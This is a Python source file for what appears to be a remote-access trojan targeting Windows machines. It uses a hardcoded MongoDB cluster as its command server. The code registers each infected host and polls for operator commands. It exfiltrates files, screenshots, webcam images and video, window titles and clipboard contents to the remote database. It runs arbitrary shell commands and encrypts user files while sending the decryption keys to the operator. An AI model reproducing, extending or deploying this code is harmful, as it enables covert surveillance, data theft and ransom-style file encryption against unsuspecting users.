import os,subprocess
import json
import rsa
import socket
import win32api
from pymongo import MongoClient
import cv2
import shutil
import numpy as np
import requests
import win32clipboard
import gridfs
import pyautogui
import pygetwindow as gw
from threading import Thread
import time
from datetime import date
import datetime



con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

try:
    response = requests.get('https://api64.ipify.org?format=json').json()
    public_ip=response['ip']
except:
    public_ip=""


hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
LAST_SEEN=""

def has_active_internet():
    if IPAddr=="127.0.0.1":
        return False
    else:
        return True

def last_seen():
    global LAST_SEEN

    db=client['shell']
    another_filter={
    "hostname":hostname
    }
    sysinfo_col=db['systemInfo']
    while True:
        today=date.today()
        times=datetime.datetime.now()
        year=today.year
        month=today.month
        day=today.day

        hour=times.hour
        minutes=times.minute
        second=times.second

        LAST_SEEN=f'{year}-{month}-{day} {hour}:{minutes}:{second}'
        value={
            "$set":{"last_seen":LAST_SEEN}
        }
        try:
            if sysinfo_col.find_one(another_filter):
                sysinfo_col.update_one(another_filter,value)
        except Exception as e:
            print(e)
        time.sleep(3)
       

def clearPrevData():
    db=client['shell']
    upload_col=db['shellresult']
    filters={
        "hostname":hostname
    }
    if (upload_col.find_one(filters)):
        upload_col.delete_one(filters)

def upload(data):
    db=client['shell']
    upload_col=db['shellresult']
    clearPrevData()
    upload_col.insert_one(data)


def imageReader(path,file):
    images = cv2.imread(f'{path}\\{file}')
    img=cv2.resize(np.array(images),(500,400))
    a=np.array(img)
    return a.tolist()

def snap():
    img=pyautogui.screenshot()
    img=cv2.resize(np.array(img),(500,400))
    a=np.array(img)
    return a.tolist()

def active_windows():
    res=gw.getAllTitles()
    data={
            "hostname":hostname,
            "result":res
        }
    upload(data)

def webcam(cwd):
    os.chdir(cwd)
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result:
        try:
            cv2.imwrite("gfg.png", image)
        except:
            pass
        finally:
            clearPrevData()


def vwebcam(cwd,time):
    os.chdir(cwd)
    cap = cv2.VideoCapture(0)
    if (cap.isOpened() == False):
        print('Unaable to open camera feed')
    frame_width = int(cap.get(3))
    frame_height = int(cap.get(4))
    out = cv2.VideoWriter('output.mp4', cv2.VideoWriter_fourcc(
    'M', 'J', 'P', 'G'), 10, (frame_width, frame_height))
    try:
        for _ in range(time*12, 0, -1):
            ret, frame = cap.read()
            if ret == True:
                cv2.flip(frame, 180)
                out.write(frame)
        
            else:
                break
            os.system('cls') 
            cap.release()
            cv2.destroyAllWindows()
    except:
        pass
    finally:
        clearPrevData()


def action_on_system(new_path="",command="",original_filename="",new_foldername="",new_filename="",path=""):
	if command=='dir':
		dirs=json.dumps(os.listdir(path))
		data={
            "hostname":hostname,
            "result":dirs
        }
		return data
	elif command=='cd':
		path=path+f'\{new_path}'
	elif command=='deletefile':
		os.remove(path+f'\{original_filename}')
	elif command=='getfile':
		with open(path+f'\{original_filename}') as f:
			con=f.read()
			return con
	elif command=='mkdir':
		os.chdir(path)
		os.mkdir(new_foldername)
	elif command=='rmdir':
		shutil.rmtree(f'{path}/{new_foldername}')
	elif command=='createfile':
		with open(path+f'/{new_filename}','w') as f:
			pass


def drives():
    disk=win32api.GetLogicalDriveStrings()
    disk=disk.split('\000')[:-1]
    data={
        "hostname":hostname,
        "result":json.dumps(disk)
    }
    upload(data)


def key_generate(path,filename):
    db=client['shell']
    file_size=os.path.getsize(str(path+filename))
    if (file_size)<400:
        try:
            if file_size==0:
                file_size=512
            publicKey, privateKey = rsa.newkeys(file_size)
            sendable_private_key=byte_to_str(privateKey)
            data={
                "hostname":hostname,
                "key":sendable_private_key,
                "path":path,
                "filename":filename
            }
            col=db['privatekey']
            col.insert_one(data)
            return publicKey
        except:
            return 404

def file_valid(file_name,path):
    valid_extension = ["c", "js", "md", "py", "ts",
                   "cpp", "css", "txt", "html", "java", "json"]
    extension=str(file_name).split('.')[1]
    for i in valid_extension:
        if i==extension:
            if os.path.isfile(path+file_name):
                return True
    return False
    

def encrypt(paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open(paths+str(file),"r") as targets:
                con=targets.read()
            with open(paths+str(file),"wb") as target:
                target.write(rsa.encrypt(con.encode(),key_generate(path=paths,filename=file)))
        except:
            return 404




def decrypt(private_key,paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open((paths)+str(file),"rb") as targets:
                con=targets.read()
            with open((paths)+str(file),"w") as target:
                target.write(rsa.decrypt(con, private_key).decode())
        except:
            return 404


def byte_to_str(key):
    return str(key.save_pkcs1(),'UTF-8')

def str_to_byte(key):
    b= bytes(key,'UTF-8')
    return rsa.PrivateKey.load_pkcs1(b.decode('utf8'))

def action_take(listen):
    db=client['shell']
    action=listen['action']
    cwd=listen['current_path']  
    try:
        if action=='dir':
            res=action_on_system(command=action,path=cwd)
            upload((res))
        elif action=='deletefile':
            target_element=listen['target_element']
            action_on_system(command=action,original_filename=target_element,path=cwd)
        elif action=='getfile':
            target_element=listen['target_element']
            content=action_on_system(command=action,original_filename=target_element,path=cwd)
            data={
                "hostname":hostname,
                "result":json.dumps(content)
            }
            upload(data)
        elif action=='mkdir':
            target_element=listen['target_element']
            action_on_system(command=action,new_foldername=target_element,path=cwd)
        elif action=='rmdir':
            target_element=listen['target_element']
            action_on_system(command=action,new_foldername=target_element,path=cwd)
        elif action=='createfile':
            target_element=listen['target_element']
            action_on_system(command=action,new_filename=target_element,path=cwd)
        elif action=='disks':
            drives()
        elif action=='encrypt':
            target_element=listen['target_element']
            encrypt(paths=cwd,file=target_element)
        elif action=='decrypt':
            target_element=listen['target_element']
            filters={
                "hostname":hostname,
                "filename":target_element
            }
            col=db['privatekey']
            x=col.find_one(filters)
            if x:
                col.delete_one(filters)
            decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
        elif action=='showimg':
            target_element=listen['target_element']
            data={
                "hostname":hostname,
                "result":imageReader(path=cwd,file=target_element)
            }
            upload(data)
        elif action=='snap':
            data={
                "hostname":hostname,
                "result":snap()
            }
            upload(data)
        elif action=='getfilesize':
            target_element=listen['target_element']
            data={
                "hostname":hostname,
                "result":(os.path.getsize(cwd+'/'+target_element))/(1024*1024)
            }
            upload(data)
        elif action=='getalltypefiles':
            target_element=listen['target_element']
            list_coll=db.list_collection_names()
            for i in list_coll:
                if i=='fs.files':
                    col=db['fs.files']
                    col.drop()
                if i=='fs.chunks':
                    coll=db['fs.chunks']
                    coll.drop()
            path=cwd+f"\{target_element}"
            try:
               file_data=open(path,'rb')
               data=file_data.read()
               fs=gridfs.GridFS(db)
               fs.put(data,filename=target_element)
               file_data.close() 
            except:
                pass
        elif action=='activewindows':
            active_windows()
        elif action=='webcam':
            webcam(cwd)
        elif action=='vwebcam':
            time=listen['timemout']
            vwebcam(cwd,int(time))
        elif listen['is_systemCommand']==1:
            cmd=listen['action']
            try:
                os.chdir(cwd)
                subprocess.run(cmd, shell=True, check=True)
                win32clipboard.OpenClipboard()
                res=win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                if res:
                    data={
                        "hostname":hostname,
                        "result":res
                    }
                    upload(data)
                else:
                    data={
                        "hostname":hostname,
                        "result":""
                    }
                    upload(data)
            except:
                pass
    except Exception as e:
        print(e)
        data={
            "hostname":hostname,
            "result":"something wrong!!!"
        }
        upload(data)


def executes():
    global LAST_SEEN
    db=client['shell']
    col=db['myshell']
    filters={
        "target":hostname
    }
    another_filter={
        "hostname":hostname
    }
    
    today=date.today()
    times=datetime.datetime.now()
    year=today.year
    month=today.month
    day=today.day
    hour=times.hour
    minutes=times.minute
    second=times.second

    data={
            "hostname":hostname,
            "ip":str(IPAddr),
            "public_ip":str(public_ip),
            "last_seen":f'{year}-{month}-{day} {hour}:{minutes}:{second}',
            "status":"Online"
        }
    sysinfo_col=db['systemInfo']
    try:
        if sysinfo_col.find_one(another_filter):
            sysinfo_col.delete_one(another_filter)
            sysinfo_col.insert_one(data)
        else:
            sysinfo_col.insert_one(data)
    except Exception as e:
        print(e)
    while True:
            try:
                listen=col.find_one(filters)
                if listen and listen['target']==hostname:
                    action_take(listen)
                    col.delete_one(filters)
            except Exception as e:
                print(e)
        

def process():
    internet=has_active_internet()
    if internet:
        Thread(target=executes).start()
        Thread(target=last_seen).start()
    else:
        print("Waiting for stable connection....")

process()